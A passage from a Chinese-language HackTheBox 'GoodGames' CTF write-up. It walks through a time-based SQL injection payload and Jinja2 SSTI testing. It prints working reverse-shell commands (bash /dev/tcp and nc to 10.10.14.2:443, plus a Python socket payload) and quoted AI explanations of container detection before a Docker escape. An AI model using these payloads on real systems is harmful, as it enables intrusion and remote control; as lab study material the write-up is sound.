+<h3 id="整体作用"><a href="#整体作用" class="headerlink" title="整体作用"></a>整体作用</h3><p>当这个payload被提交后：  </p>
+<ul>
+<li>如果目标存在SQL注入漏洞，数据库会执行<code>SLEEP(5)</code>，导致服务器响应延迟约5秒。  </li>
+<li>如果不存在漏洞，<code>SLEEP(5)</code>不会被执行，响应时间正常。</li>
+</ul>
+<p>通过观察响应延迟，即可判断目标是否存在可利用的SQL注入点，这是时间盲注（无法直接获取回显时）的典型检测方式。由于使用了<code>SLEEP</code>函数，该payload仅适用于MySQL 5.0.12及以上版本（此版本开始支持<code>SLEEP</code>函数）。</p>
+</blockquote>
+<p>当我正常发送数据时，响应很快就显示出来，而当我发送探测的payload，这需要等待一小会，那么代表着payload的确生效了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">email=111@111.com&#x27;+AND+(SELECT+9146+FROM+(SELECT(SLEEP(5)))gAfY)+AND+&#x27;khwY&#x27;=&#x27;khwY&amp;password=111</span><br></pre></td></tr></table></figure>
+
+<p><img src="/image/Goodgames/fe8f6554bce6b80a443b7a3513043140_MD5.jpeg"></p>
+<p>这里有更详细的手动获取数据的方法：<a target="_blank" rel="noopener" href="https://7rocky.github.io/en/htb/goodgames/">GoodGames | 7Rocky</a>，感兴趣的可以手动尝试一下，毕竟一直依赖自动化工具也不是一件好事</p>
+<h3 id="登录后台-利用SSTI模板注入漏洞执行反弹shell"><a href="#登录后台-利用SSTI模板注入漏洞执行反弹shell" class="headerlink" title="登录后台 - 利用SSTI模板注入漏洞执行反弹shell"></a>登录后台 - 利用SSTI模板注入漏洞执行反弹shell</h3><p>我使用发现的邮箱以及密码登录并成功登录后台</p>
+<p><img src="/image/Goodgames/fd06bfde95c288ee011285decfda4559_MD5.jpeg"></p>
+<p>当我把鼠标移动到设置的位置，左下角出现了<code>internal-administration.goodgames.htb</code>，点击之后跳转到了这个域名上，我将其加到hosts文件中并再次访问，这次会看到一个新的登录界面</p>
+<p><img src="/image/Goodgames/1d13e39a1ba5e62c09931df05a33e6bc_MD5.jpeg"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo vim /etc/hosts</span><br><span class="line">internal-administration.goodgames.htb</span><br></pre></td></tr></table></figure>
+
+<p><img src="/image/Goodgames/d8079297ec1b1032a8b612d8c39dc19b_MD5.jpeg"></p>
+<p>我尝试使用前面发现的凭证进行登录</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin / superadministrator</span><br></pre></td></tr></table></figure>
+
+<p><img src="/image/Goodgames/eb10d4b127dc11caed7d864e36ef91c5_MD5.jpeg"><br><img src="/image/Goodgames/6d9d171a944131aac5b4cbdc6db9f271_MD5.jpeg"></p>
+<p>这成功进入了后台，后续的测试我参考了<a target="_blank" rel="noopener" href="https://blog.0xzon.dev/2022-03-04-HTB-GoodGames/">Avinash kumar</a>写的WP，（感谢他以及其他的作者写的文章让我能够成功的拿下机器）其中他提到了<code>由于这是一个Python应用程序，不要忘记测试服务器端模板注入（SSTI）。**&#123;&#123;7*7&#125;&#125;</code>这句话，对于SSTI漏洞我是不够了解的，所以我在这里也产生了很多疑问，下面是AI给我疑惑的解释</p>
+<blockquote>
+<p>对于这篇文章提到的这一段话，为什么他会这么说，SSTI漏洞和python有什么联系，为什么这里看到python就要尝试测试是否存在SSTI漏洞</p>
+</blockquote>
+<blockquote>
+<p>—–<strong>解答</strong>—–</p>
+<p>要理解“Python应用需测试SSTI”的逻辑，需要从<strong>SSTI漏洞的本质</strong>、<strong>Python Web生态的特性</strong>、<strong>主流Python模板引擎的风险点</strong>三个层面拆解，核心是“Python Web应用与模板引擎的强绑定”导致SSTI成为高频风险。</p>
+<h3 id="一、先明确：SSTI漏洞的本质是什么？"><a href="#一、先明确：SSTI漏洞的本质是什么？" class="headerlink" title="一、先明确：SSTI漏洞的本质是什么？"></a>一、先明确：SSTI漏洞的本质是什么？</h3><p>SSTI（Server-Side Template Injection，服务器端模板注入）的核心是<strong>模板引擎将“用户可控输入”误解析为“模板代码”并执行</strong>，最终导致攻击者注入恶意代码操控服务器。</p>
+<p>举个最简单的例子：<br>如果网站用模板渲染“用户昵称”，正常逻辑是把用户输入的“test”当成<strong>纯文本数据</strong>嵌入页面；但如果模板引擎配置不当，用户输入<code>&#123;&#123;7*7&#125;&#125;</code>时，引擎会把它当成<strong>模板语法</strong>执行计算，最终页面显示“49”——这就证明存在SSTI（因为输入被解析为代码了）。</p>
+<h3 id="二、SSTI与Python的核心联系：Python-Web生态高度依赖“模板引擎”"><a href="#二、SSTI与Python的核心联系：Python-Web生态高度依赖“模板引擎”" class="headerlink" title="二、SSTI与Python的核心联系：Python Web生态高度依赖“模板引擎”"></a>二、SSTI与Python的核心联系：Python Web生态高度依赖“模板引擎”</h3><p>SSTI并非Python专属，但<strong>Python是SSTI漏洞的“重灾区”</strong>，根本原因是：<br>Python的主流Web框架（如Flask、Django、Tornado）为了实现“动态页面生成”，几乎都默认集成了「模板引擎」，而这些引擎的设计特性（为了灵活性支持代码表达式）本身就存在注入风险。</p>
+<h4 id="1-Python-Web框架与模板引擎的“强绑定”"><a href="#1-Python-Web框架与模板引擎的“强绑定”" class="headerlink" title="1. Python Web框架与模板引擎的“强绑定”"></a>1. Python Web框架与模板引擎的“强绑定”</h4><p>Python开发者很少手写静态HTML，而是通过模板引擎动态拼接页面（比如渲染用户信息、商品列表）。常见的“框架-模板引擎”组合如下：</p>
+<table>
+<thead>
+<tr>
+<th>Python Web 框架</th>
+<th>默认模板引擎</th>
+<th>模板语法特征（易被注入的标识）</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Flask</td>
+<td>Jinja2</td>
+<td><code>&#123;&#123; 表达式 &#125;&#125;</code>（如<code>&#123;&#123;os.popen('id').read()&#125;&#125;</code>）</td>
+</tr>
+<tr>
+<td>Django</td>
+<td>Django 模板</td>
+<td><code>&#123;&#123; 变量 &#125;&#125;</code>、<code>&#123;% 代码块 %&#125;</code>（如<code>&#123;% import os %&#125;</code>）</td>
+</tr>
+<tr>
+<td>Tornado</td>
+<td>Tornado 模板</td>
+<td><code>&#123;&#123; 表达式 &#125;&#125;</code>、<code>&#123;% 逻辑块 %&#125;</code></td>
+</tr>
+</tbody></table>
+<p>这些模板引擎的共同特点是：<strong>支持在模板中写代码表达式&#x2F;逻辑</strong>（比如循环、变量运算、调用模块）——这是为了开发者便利，但也给攻击者留下了“注入入口”。</p>
+<h4 id="2-Python模板引擎的“风险点”：开发者容易犯的错"><a href="#2-Python模板引擎的“风险点”：开发者容易犯的错" class="headerlink" title="2. Python模板引擎的“风险点”：开发者容易犯的错"></a>2. Python模板引擎的“风险点”：开发者容易犯的错</h4><p>SSTI的触发不只是引擎本身的问题，更常见的是<strong>开发者的不规范使用</strong>，而Python生态的“易用性”反而放大了这种风险：  </p>
+<ul>
+<li>错误场景1：直接将用户输入嵌入模板（而非作为“数据”传递）<br>比如Flask中，开发者如果写了这样的代码：</li>
+</ul>
+</blockquote>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 危险！将用户输入的name直接拼到模板字符串中</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/profile&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">profile</span>():</span><br><span class="line">name = request.args.get(<span class="string">&quot;name&quot;</span>)  <span class="comment"># 用户可控输入</span></span><br><span class="line">template = <span class="string">f&quot;&lt;h1&gt;Hello <span class="subst">&#123;name&#125;</span>&lt;/h1&gt;&quot;</span>  <span class="comment"># 直接拼接成模板</span></span><br><span class="line"><span class="keyword">return</span> render_template_string(template)  <span class="comment"># 渲染模板</span></span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>  此时用户传入<code>name=&#123;&#123;os.popen('cat /etc/passwd').read()&#125;&#125;</code>，Jinja2会将<code>&#123;&#123; &#125;&#125;</code>内的内容解析为Python代码，直接读取服务器敏感文件。</p>
+<ul>
+<li>错误场景2：忽略模板引擎的“安全过滤”<br>部分Python模板引擎（如Jinja2）虽有默认过滤机制，但开发者可能为了“灵活性”手动关闭（比如用<code>|safe</code>过滤器取消转义），或自定义模板时未做输入校验，导致注入成立。</li>
+</ul>
+<h3 id="三、为什么“看到Python应用就优先测SSTI”？"><a href="#三、为什么“看到Python应用就优先测SSTI”？" class="headerlink" title="三、为什么“看到Python应用就优先测SSTI”？"></a>三、为什么“看到Python应用就优先测SSTI”？</h3><p>文章中提到“由于这是一个Python应用，不要忘记测试SSTI”，本质是<strong>基于“概率性风险”的测试策略</strong>——不是所有Python应用都有SSTI，而是“Python Web应用存在SSTI的概率远高于其他语言”，理由有二：</p>
+<h4 id="1-Python模板引擎的“注入标识”极容易验证"><a href="#1-Python模板引擎的“注入标识”极容易验证" class="headerlink" title="1. Python模板引擎的“注入标识”极容易验证"></a>1. Python模板引擎的“注入标识”极容易验证</h4><p>Python主流模板引擎（如Jinja2）的语法非常有辨识度，比如<code>&#123;&#123; 表达式 &#125;&#125;</code>——攻击者只需输入<code>&#123;&#123;7*7&#125;&#125;</code>或<code>&#123;&#123;1+1&#125;&#125;</code>，如果页面返回“49”或“2”，就能快速确认“模板引擎在执行代码”，进而判断存在SSTI漏洞。<br>这种“低成本验证”让SSTI成为Python应用的“必测项”（测试成本低，收益高）。</p>
+<h4 id="2-文章场景的“精准指向”：已确认是Flask应用"><a href="#2-文章场景的“精准指向”：已确认是Flask应用" class="headerlink" title="2. 文章场景的“精准指向”：已确认是Flask应用"></a>2. 文章场景的“精准指向”：已确认是Flask应用</h4><p>文章中其实有一个关键线索：端口扫描结果显示<code>Werkzeug/2.0.2 Python/3.9.2</code>——而Werkzeug是Flask框架的默认WSGI服务器（相当于Flask的“专属组件”）。<br>既然确认是Flask应用，就等于确认了“使用Jinja2模板引擎”（Flask默认配置），而Jinja2正是SSTI的高频载体（历史上大量Flask应用因模板使用不当爆发SSTI）。<br>因此，文章的提醒并非“泛泛而谈Python”，而是“精准定位到Flask+Jinja2的组合，必须测SSTI”。</p>
+<h3 id="四、总结：核心逻辑链"><a href="#四、总结：核心逻辑链" class="headerlink" title="四、总结：核心逻辑链"></a>四、总结：核心逻辑链</h3><p>用户输入<code>&#123;&#123;7*7&#125;&#125;</code> → 页面显示“49” → 证明模板引擎执行了代码 → 存在SSTI风险<br>↓<br>Python应用（尤其是Flask&#x2F;Django）→ 默认用Jinja2等支持代码表达式的模板引擎 → 开发者易犯“直接拼接用户输入到模板”的错误 → SSTI成为高频漏洞<br>↓<br>因此，安全测试中“看到Python Web应用（尤其是带动态页面的），优先用<code>&#123;&#123;7*7&#125;&#125;</code>等简单表达式验证SSTI”，是性价比极高的测试策略。</p>
+</blockquote>
+<p>根据AI的回答我对此有了基本的认知，那么接下来根据<code>Avinash kumar</code>的方法来进行测试</p>
+<p><img src="/image/Goodgames/f97784593a7eae6c7a239849e6ef3104_MD5.jpeg"></p>
+<p>输入<code>&#123;1+1&#125;</code>或者<code>**&#123;&#123;7*7&#125;&#125;</code></p>
+<p><img src="/image/Goodgames/21cb9be48a1e26ca32d28cf63fcee60c_MD5.jpeg"><br><img src="/image/Goodgames/43e689550e33157b554e9cea2827fa46_MD5.jpeg"></p>
+<p>显示的是49，存在SSTI漏洞，但是对于<code>Avinash kumar</code>提到的，<code>它正在运行jinja2模板</code>，这句话让我无法理解，下面是AI给我的解释，再往后看我发现了作者提到了很多其他学习的链接</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection">PayloadsAllTheThings&#x2F;Server Side Template Injection at master · swisskyrepo&#x2F;PayloadsAllTheThings · GitHub</a><br><a target="_blank" rel="noopener" href="https://www.youtube.com/watch?v=7o1J8vHdlYc">Exploring Python SSTI Payloads - Bolt Beyond Root [HackTheBox] - YouTube</a><br><a target="_blank" rel="noopener" href="https://newrouge.blogspot.com/2022/02/epsilon-hackthebox.html">Epsilon - HackTheBox</a> - 作者的其他博客，涉及到了对于0xdf视频的书面解释</p>
+<blockquote>
+<p>—–<strong>文章中提到了网站正在运行jinja2模板，这个信息是从哪里获得的</strong>—–</p>
+<p>文章中判断“网站正在运行jinja2模板”，并非通过某款工具直接“扫描识别”，而是基于**“Python Web框架特性+SSTI测试结果”的组合推导**，核心是利用“Flask与Jinja2的强绑定关系”和“Jinja2的语法特征验证”，具体逻辑链如下：</p>
+<h3 id="第一步：从“Werkzeug服务器”锁定“Flask框架”（基础前提）"><a href="#第一步：从“Werkzeug服务器”锁定“Flask框架”（基础前提）" class="headerlink" title="第一步：从“Werkzeug服务器”锁定“Flask框架”（基础前提）"></a>第一步：从“Werkzeug服务器”锁定“Flask框架”（基础前提）</h3><p>文章中端口扫描结果给出了关键线索：  </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">PORT   STATE SERVICE  REASON  VERSION</span><br><span class="line">80/tcp open  ssl/http syn-ack Werkzeug/2.0.2 Python/3.9.2</span><br></pre></td></tr></table></figure>
+<p>这里的<code>Werkzeug</code>是核心突破口——它并非独立的Web服务器，而是<strong>Python Flask框架的“专属WSGI工具集”</strong>（WSGI是Python Web应用与服务器的通信标准）。<br>在Python生态中，<code>Werkzeug</code>几乎与Flask绑定：只要看到服务器标识包含<code>Werkzeug</code>，99%的概率是该应用基于Flask开发（除非是极小众的自定义配置，但在CTF场景中默认按主流情况判断）。</p>
+<h3 id="第二步：从“Flask框架”关联“Jinja2模板引擎”（生态常识）"><a href="#第二步：从“Flask框架”关联“Jinja2模板引擎”（生态常识）" class="headerlink" title="第二步：从“Flask框架”关联“Jinja2模板引擎”（生态常识）"></a>第二步：从“Flask框架”关联“Jinja2模板引擎”（生态常识）</h3><p>Flask框架本身不具备“动态页面渲染”能力，它<strong>默认集成并强制依赖Jinja2作为模板引擎</strong>——这是Flask的核心设计特性，也是Python Web开发的常识：  </p>
+<ul>
+<li>开发者用Flask写动态页面时，无需额外配置模板引擎，直接调用<code>render_template()</code>或<code>render_template_string()</code>函数，底层就是通过Jinja2解析模板文件；  </li>
+<li>不存在“Flask+非Jinja2模板”的主流场景（除非开发者刻意替换，但属于极少数情况，CTF中优先按默认配置判断）。</li>
+</ul>
+<p>因此，当通过<code>Werkzeug</code>锁定“Flask框架”后，即可自然推导出“该应用使用Jinja2作为模板引擎”。</p>
+<h3 id="第三步：用“SSTI测试结果”验证“Jinja2特性”（最终确认）"><a href="#第三步：用“SSTI测试结果”验证“Jinja2特性”（最终确认）" class="headerlink" title="第三步：用“SSTI测试结果”验证“Jinja2特性”（最终确认）"></a>第三步：用“SSTI测试结果”验证“Jinja2特性”（最终确认）</h3><p>文章中通过注入<code>&#123;&#123;7*7&#125;&#125;</code>完成了验证：输入该表达式后，页面显示“49”（即表达式被执行）。这一结果进一步印证了“Jinja2模板”的判断，因为：  </p>
+<ul>
+<li><strong>Jinja2的标志性语法就是<code>&#123;&#123; 表达式 &#125;&#125;</code></strong>：这是Jinja2用于“嵌入变量&#x2F;执行简单代码”的核心语法，其他Python模板引擎（如Django模板）虽也用<code>&#123;&#123; &#125;&#125;</code>，但对“直接执行运算表达式”的支持不同（Django模板默认限制更严格，需特殊配置才允许<code>7*7</code>这类运算，而Jinja2默认支持）；  </li>
+<li>测试结果符合Jinja2的行为：<code>&#123;&#123;7*7&#125;&#125;</code>在Jinja2中会被解析为Python代码并执行（Jinja2的表达式支持Python的基本运算、函数调用等），最终返回计算结果——这与文章中“页面显示49”的现象完全匹配，排除了其他模板引擎的可能性。</li>
+</ul>
+<h3 id="总结：信息来源的核心逻辑"><a href="#总结：信息来源的核心逻辑" class="headerlink" title="总结：信息来源的核心逻辑"></a>总结：信息来源的核心逻辑</h3><p>“网站运行jinja2模板”的结论，是通过3个环环相扣的线索推导得出：<br><code>端口扫描发现Werkzeug服务器</code> → <code>锁定Flask框架</code> → <code>Flask默认集成Jinja2</code> → <code>SSTI测试（&#123;&#123;7*7&#125;&#125;→49）验证Jinja2语法特性</code><br>本质是“利用Python Web生态的固定关联关系”+“通过语法特征做最终确认”，而非直接工具识别。</p>
+</blockquote>
+<p>下面是<code>Avinash kumar</code>对于有效载荷的简单解释</p>
+<p><code>&#123;&#123; namespace.__init__.__globals__.os.popen('id').read() &#125;&#125;</code></p>
+<p><img src="/image/Goodgames/def7416333efb1dc700dc0e2e7512534_MD5.jpeg"><br><img src="/image/Goodgames/c7f165f8ebd3b9a57f21a1e4c6ab349e_MD5.jpeg"></p>
+<blockquote>
+<p>我将使用<code>&#123;&#123; namespace.__init__.__globals__.os.popen('id').read() &#125;&#125;</code>有效载荷来获取shell。大致过程是，你访问jinja2中的namespace类，在该类中可以访问init函数，在Python中，每个类都定义了这个函数，它类似于该类的构造函数，之后访问init可调用的globals函数，最后就能访问像popen或os这样的Python模块来运行命令。</p>
+</blockquote>
+<p><code>&#123;&#123; namespace.__init__.__globals__.os.popen('busybox nc 10.10.14.2 443 -e /bin/bash').read() &#125;&#125;</code>  失败<br><code>&#123;&#123; namespace.__init__.__globals__.os.popen('bash -c "bash -i >& /dev/tcp/10.10.14.2/443 0>&1"').read() &#125;&#125;</code>  成功</p>
+<p>后面我思考这里失败的原因会不会是没有加上<code>bash -c</code>，尝试之后依然还是失败，可能是和busybox有关</p>
+<p><img src="/image/Goodgames/bf9f59432727350935eca968d10e85a1_MD5.jpeg"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rlwrap -cAr nc -nlvp 443</span><br></pre></td></tr></table></figure>
+
+<p><img src="/image/Goodgames/aac40771ebab8528c2614922088d9e84_MD5.jpeg"></p>
+<p>成功获得shell，并且还是root的权限（但是这只能看到user.txt，无法找到root.txt）</p>
+<p>其中<code>Aaron Haymore</code>提到了<a target="_blank" rel="noopener" href="https://jayaye15.medium.com/jinja2-server-side-template-injection-ssti-9e209a6bbdf6">Jinja2 — Server Side Template Injection (SSTI) | by jb00gie | Medium</a>，此文章给出了下面利用SSTI反弹shell的方式，我没有尝试这个方法，感兴趣的可以试试</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;% for x in ().__class__.__base__.__subclasses__() %&#125;&#123;% if &quot;warning&quot; in x.__name__ %&#125;&#123;&#123;x()._module.__builtins__[&#x27;__import__&#x27;](&#x27;os&#x27;).popen(&quot;python3 -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\&quot;x.x.x.x\&quot;,PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\&quot;/bin/sh\&quot;, \&quot;-i\&quot;]);&#x27;&quot;)&#125;&#125;&#123;%endif%&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>
+
+<h1 id="权限提升-docker逃逸"><a href="#权限提升-docker逃逸" class="headerlink" title="权限提升 - docker逃逸"></a>权限提升 - docker逃逸</h1><p>枚举目录发现Dockerfile</p>
+<p><img src="/image/Goodgames/12dab3e0e1ad7e61d2c5bde7b3f33cea_MD5.jpeg"></p>
+<h2 id="判断shell是否存在于docker中"><a href="#判断shell是否存在于docker中" class="headerlink" title="判断shell是否存在于docker中"></a>判断shell是否存在于docker中</h2><p>关于判断当前shell是否在docker中，AI给出了下面的解释</p>
+<blockquote>
+<p>—–<strong>判断shell是否存在于docker中</strong>—–</p>
+<p>作者判断获得的shell处于Docker环境中，核心是基于<strong>Docker容器的典型技术特征</strong>与<strong>系统信息的交叉验证</strong>，文章中明确提到了多个关键线索，同时结合Linux系统下Docker的底层隔离机制（如cgroup、挂载、网络），最终形成确定性判断。具体逻辑可拆解为以下5个关键依据：</p>
+<h3 id="1-第一线索：异常的hostname（初步怀疑）"><a href="#1-第一线索：异常的hostname（初步怀疑）" class="headerlink" title="1. 第一线索：异常的hostname（初步怀疑）"></a>1. 第一线索：异常的<code>hostname</code>（初步怀疑）</h3><p>Docker容器的<code>hostname</code>（主机名）有一个显著特征：<strong>默认是随机生成的短哈希值</strong>（如<code>a3f2d1e4b5c6</code>），而非物理机&#x2F;虚拟机那种有意义的主机名（如<code>ubuntu-server-01</code>）。<br>文章中虽未直接贴出<code>hostname</code>命令的输出，但作者提到“looking at hostname and dockerfile all over the place”——这意味着：  </p>
+<ul>
+<li>执行<code>hostname</code>命令后，看到的是无意义的随机字符串（符合Docker容器的默认hostname规则）；  </li>
+<li>同时在系统中发现了<code>Dockerfile</code>相关文件（容器构建时的配置文件，物理机&#x2F;虚拟机中通常不会存在），二者结合初步指向“当前环境是Docker容器”。</li>
+</ul>
+<h3 id="2-核心验证：-proc-1-cgroup文件的Docker标识（关键证据）"><a href="#2-核心验证：-proc-1-cgroup文件的Docker标识（关键证据）" class="headerlink" title="2. 核心验证：/proc/1/cgroup文件的Docker标识（关键证据）"></a>2. 核心验证：<code>/proc/1/cgroup</code>文件的Docker标识（关键证据）</h3><p>这是Linux系统中判断“是否在容器内”的<strong>行业标准方法</strong>，文章明确提到：“one way to confirm if you are running in dockerenv to check <code>/proc/1/cgroup</code>”。<br>原理背景：  </p>
+<ul>
+<li><code>cgroup</code>（控制组）是Linux内核的特性，Docker通过<code>cgroup</code>实现对容器的资源隔离（如CPU、内存限制）；  </li>
+<li>物理机&#x2F;虚拟机的<code>/proc/1/cgroup</code>（1号进程是<code>systemd</code>或<code>init</code>）中，控制组路径通常是系统默认路径（如<code>/system.slice/systemd-journald.service</code>）；  </li>
+<li>而Docker容器的<code>/proc/1/cgroup</code>中，<strong>所有控制组路径都会包含<code>docker</code>关键字+容器ID</strong>（如<code>/docker/a3f2d1e4b5c6.../cpu,cpuacct</code>），这是Docker为容器分配独立控制组的标志。</li>
+</ul>
+<p>文章中作者通过<code>cat /proc/1/cgroup</code>看到了“docker ids”，直接确认当前环境被Docker的<code>cgroup</code>管理，属于容器内环境。</p>
+<h3 id="3-辅助线索：异常的用户与挂载目录（侧面印证）"><a href="#3-辅助线索：异常的用户与挂载目录（侧面印证）" class="headerlink" title="3. 辅助线索：异常的用户与挂载目录（侧面印证）"></a>3. 辅助线索：异常的用户与挂载目录（侧面印证）</h3><p>文章提到两个与“物理机逻辑矛盾”的现象，进一步支持Docker判断：  </p>
+<ul>
+<li>现象1：<code>/home/augustus</code>存在，但<code>/etc/passwd</code>无该用户<br><code>/etc/passwd</code>是Linux系统存储用户信息的核心文件，物理机&#x2F;虚拟机中“存在用户目录却无用户记录”是不可能的；但Docker容器中常见“主机目录挂载”——<code>/home/augustus</code>实际是<strong>从宿主机（物理机）挂载到容器内的目录</strong>，容器内的<code>/etc/passwd</code>并未同步宿主机的用户信息，因此出现“目录存在但用户不存在”的矛盾。  </li>
+<li>现象2：<code>mount</code>命令确认目录来自宿主机<br>作者通过<code>mount</code>命令查看挂载信息，发现<code>/home/augustus</code>的“挂载源”是宿主机的目录（而非容器内部存储），且具备读写权限——这符合Docker的<code>-v</code>（目录挂载）功能，是容器与宿主机共享文件的典型配置，物理机中不会有这种“跨环境挂载”。</li>
+</ul>
+<h3 id="4-网络线索：Docker专属的私有网段IP（补充验证）"><a href="#4-网络线索：Docker专属的私有网段IP（补充验证）" class="headerlink" title="4. 网络线索：Docker专属的私有网段IP（补充验证）"></a>4. 网络线索：Docker专属的私有网段IP（补充验证）</h3><p>文章中作者通过<code>ifconfig</code>发现当前shell的IP是<code>172.19.0.2</code>，这一IP段有特殊意义：  </p>
+<ul>
+<li>Docker默认的“桥接网络”（<code>docker0</code>）使用私有网段，常见为<code>172.17.0.0/16</code>或<code>172.19.0.0/16</code>（不同环境可能略有差异）；  </li>
+<li>容器在该网络中会被分配独立IP（如<code>172.19.0.2</code>），而宿主机（物理机）通常是该网段的“网关IP”（如<code>172.19.0.1</code>）；  </li>
+<li>作者后续扫描发现<code>172.19.0.1</code>开放22端口（SSH），但之前扫描目标机器<code>10.10.11.130</code>时22端口未开放——这说明<code>172.19.0.1</code>是宿主机，<code>172.19.0.2</code>是容器，容器通过桥接网络访问宿主机，进一步印证了Docker环境。</li>
+</ul>
+<h3 id="5-权限逻辑：容器内“root”的局限性（隐性佐证）"><a href="#5-权限逻辑：容器内“root”的局限性（隐性佐证）" class="headerlink" title="5. 权限逻辑：容器内“root”的局限性（隐性佐证）"></a>5. 权限逻辑：容器内“root”的局限性（隐性佐证）</h3><p>文章中提到“After getting rev. shell we are already running as root”，但随即补充“of course we are in docker”——这是基于Docker权限逻辑的常识：  </p>
+<ul>
+<li>Docker容器内的<code>root</code>并非“宿主机的root”，而是“容器内的特权用户”，权限被限制在容器的隔离环境中（如无法修改宿主机的<code>/etc/passwd</code>）；  </li>
+<li>如果是物理机&#x2F;虚拟机的root，理论上已拥有完整控制权，无需后续“Docker逃逸”操作；而作者明确需要“escape this docker”，反推当前root是容器内的root，进一步确认环境属性。</li>
+</ul>
+<h3 id="总结：判断逻辑链"><a href="#总结：判断逻辑链" class="headerlink" title="总结：判断逻辑链"></a>总结：判断逻辑链</h3><p>作者的判断是“多线索交叉验证”的结果，而非单一证据：<br><code>异常hostname + 存在Dockerfile</code>（初步怀疑）→ <code>cat /proc/1/cgroup看到docker标识</code>（核心证据）→ <code>用户目录与/etc/passwd矛盾+mount确认宿主机挂载</code>（侧面印证）→ <code>IP属于Docker私有网段+容器内root需逃逸</code>（补充验证）<br>最终形成“当前shell在Docker容器中”的确定性结论，这也是渗透测试中判断容器环境的标准方法论。</p>
+</blockquote>
+<p>引用作者的几段话</p>
+<blockquote>
+<p>但当然，我们是在docker环境中，到处都能看到主机名和dockerfile。另外，有一种方法可以确认你是否在dockerenv中运行，那就是检查&#x2F;proc&#x2F;1&#x2F;cgroup。cgroup是控制组，它与命名空间结合使用，为容器环境隔离不同的进程。它们都是Linux内核的特性。命名空间为不同的进程分配资源（CPU、内存等），给用户一种类似虚拟机的感觉，而控制组则控制这种分配，即哪些进程可以访问多少资源。更多相关内容请见<a target="_blank" rel="noopener" href="https://www.nginx.com/blog/what-are-namespaces-cgroups-how-do-they-work/">此处</a>。回到主题。如果你执行cat &#x2F;proc&#x2F;1&#x2F;cgroup命令，看到一些docker ID，这意味着你处于docker环境中，这些是docker正在使用的控制组。否则，这些内容将是空白的。在我们的例子中如下所示：</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /proc/1/cgroup</span><br></pre></td></tr></table></figure>
+
+<p><img src="/image/Goodgames/9ad7afdd3db970ee4e586595437e8f9b_MD5.jpeg"></p>
+<blockquote>
+<p>让我们试着逃离这个容器。存在一个用户augustus的主目录。但&#x2F;etc&#x2F;passwd中没有该用户，且你无法切换到augustus用户。看起来它是从主机挂载过来的。你也可以运行mount命令，查看它确实是从主机挂载的，以及其读写权限。</p>
+</blockquote>
+<p><img src="/image/Goodgames/0ed032eff9501ceef4a03df5c0185bb7_MD5.jpeg"></p>
+<h2 id="关于从mount结果判断augustus用户是否从主机挂载的解释"><a href="#关于从mount结果判断augustus用户是否从主机挂载的解释" class="headerlink" title="关于从mount结果判断augustus用户是否从主机挂载的解释"></a>关于从mount结果判断augustus用户是否从主机挂载的解释</h2><blockquote>
+<p>—–<strong>关于从mount结果判断augustus用户是否从主机挂载的解释</strong>—–</p>
+<p>要从你提供的<code>mount</code>命令结果中，判断<code>/home/augustus</code>是“从主机挂载”且“具备读写权限”，核心是分析<strong>挂载源（设备）、文件系统类型、挂载选项</strong>这三个关键信息，结合Docker容器的存储特性即可推导，具体判断依据如下：</p>
+<h3 id="一、第一步：定位-home-augustus的挂载条目"><a href="#一、第一步：定位-home-augustus的挂载条目" class="headerlink" title="一、第一步：定位/home/augustus的挂载条目"></a>一、第一步：定位<code>/home/augustus</code>的挂载条目</h3><p>在你提供的<code>mount</code>结果中，直接找到与<code>/home/augustus</code>相关的行，这是分析的核心对象：  </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/dev/sda1 on /home/augustus type ext4 (rw,relatime,errors=remount-ro)</span><br></pre></td></tr></table></figure>
+<p>这条记录包含三个关键信息：  </p>
+<ol>
+<li><strong>挂载源（左）</strong>：<code>/dev/sda1</code>（挂载的设备）；  </li>
+<li><strong>挂载点（中）</strong>：<code>/home/augustus</code>（容器内的目录）；  </li>
+<li><strong>挂载选项（右）</strong>：<code>rw,relatime,errors=remount-ro</code>（权限与特性配置）。</li>
+</ol>
+<h3 id="二、判断“从主机挂载”：看「挂载源-文件系统类型」与Docker容器的存储特性"><a href="#二、判断“从主机挂载”：看「挂载源-文件系统类型」与Docker容器的存储特性" class="headerlink" title="二、判断“从主机挂载”：看「挂载源+文件系统类型」与Docker容器的存储特性"></a>二、判断“从主机挂载”：看「挂载源+文件系统类型」与Docker容器的存储特性</h3><p>Docker容器的存储分为两类：<strong>容器内部的“虚拟文件系统”</strong> 和 <strong>从宿主机（主机）挂载的“实体文件系统”</strong>，二者的区别通过“挂载源”和“文件系统类型”可明确区分：</p>
